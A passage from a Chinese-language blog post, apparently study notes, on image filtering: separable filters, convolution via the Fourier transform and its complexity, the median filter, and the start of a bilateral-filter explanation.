<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_232425.png"><br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_232307.png"><br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_232301.png"></p>
<p>当然并不是所有的滤波器都是可以分离的，比如box和gaussian是可以分离的，但是pillowbox就不行</p>
<p>那么这种情况的的复杂度是多少呢，假设二维</p>
<ul>
<li>每个像素需要的操作：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>m</mi></mrow><annotation encoding="application/x-tex">2m </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mord mathnormal">m</span></span></span></span>次相乘，一次x,y</li>
<li>总共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">2n </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span></span></span></span>个像素</li>
</ul>
<p>所以时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>2</mn><mi>m</mi><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2mn^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<p>所以分离再乘可以把计算复杂度从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>m</mi><mn>2</mn></msup><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m^2n^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 降低到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
<h3 id="Convolution-Theorem-卷积定理"><a href="#Convolution-Theorem-卷积定理" class="headerlink" title="Convolution Theorem (卷积定理)"></a>Convolution Theorem (卷积定理)</h3><p>根据卷积定理，我们可以把如下的卷积过程</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>⊗</mo><mi>i</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i&#x27;(x, y) = f(x, y) \otimes i(x, y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></p>
<p>丢到傅立叶空间</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="script">F</mi><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo><mo>⋅</mo><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}&#x27;(w_x, w_y) = \mathcal{F}(w_x, w_y) \cdot \mathcal{I}(w_x, w_y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathcal" style="margin-right:0.09931em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}&#x27;(w_x, w_y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.038em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">F</mi><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{F}(w_x, w_y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathcal" style="margin-right:0.09931em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi><mo stretchy="false">(</mo><msub><mi>w</mi><mi>x</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>y</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{I}(w_x, w_y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 分别为经过傅立叶变换后的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i&#x27;(x, y)  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x, y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i(x, y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></p>
<p>最后再通过iFFT就可以得到卷积后的图像了。</p>
<p>那么这种情况的的复杂度是多少呢</p>
<ul>
<li>对图像做傅立叶变换: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2\log{n}) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span></span><span class="mclose">)</span></span></span></span></li>
<li>对滤波器做傅立叶变换: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>m</mi><mn>2</mn></msup><mi>log</mi><mo>⁡</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m^2\log{m}) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">m</span></span><span class="mclose">)</span></span></span></span></li>
<li>相乘: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
</ul>
<p>最终的复杂度:  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> (至少要比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>m</mi><mn>2</mn></msup><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m^2n^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>好，笑)</p>
<h1 id="Non-Linear-Filter-非线性滤波"><a href="#Non-Linear-Filter-非线性滤波" class="headerlink" title="Non-Linear Filter (非线性滤波)"></a>Non-Linear Filter (非线性滤波)</h1><h2 id="Median-Filter-中值滤波器"><a href="#Median-Filter-中值滤波器" class="headerlink" title="Median Filter (中值滤波器)"></a>Median Filter (中值滤波器)</h2><p>就是取中间值，简单的去噪滤波器</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>Median</mtext><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><mi>k</mi><mo>:</mo><mi>X</mi><mo>+</mo><mi>k</mi><mo separator="true">,</mo><mi>Y</mi><mo>−</mo><mi>k</mi><mo>:</mo><mi>Y</mi><mo>+</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = \text{Median}(I(X - k : X + k, Y - k : Y + k))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Median</span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span></span></span></span></p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_001020.png"></p>
<blockquote>
<p>去噪</p>
</blockquote>
<h2 id="Bilateral-Filter-双边滤波器"><a href="#Bilateral-Filter-双边滤波器" class="headerlink" title="Bilateral Filter (双边滤波器)"></a>Bilateral Filter (双边滤波器)</h2><p>和高斯滤波器相同，但是不同的像素会有不同的权重。</p>
<ul>
<li>空间距离: 离中心像素越近的像素会有更高的权重，距离越远则权重越低</li>
